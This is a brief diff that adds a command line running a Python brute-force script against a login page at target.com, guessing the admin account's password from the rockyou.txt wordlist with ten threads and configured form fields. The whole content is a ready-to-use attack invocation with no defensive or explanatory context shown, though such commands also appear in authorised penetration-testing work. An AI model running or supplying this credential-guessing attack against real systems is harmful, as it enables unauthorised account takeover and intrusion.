@@ -1,0 +1,8 @@
+python3 bruteforce.py \
+  --url http://target.com/login \
+  --user admin \
+  --passlist wordlists/rockyou.txt \
+  --user-field username \
+  --pass-field password \
+  --fail-identifier "Invalid" \
+  --threads 10
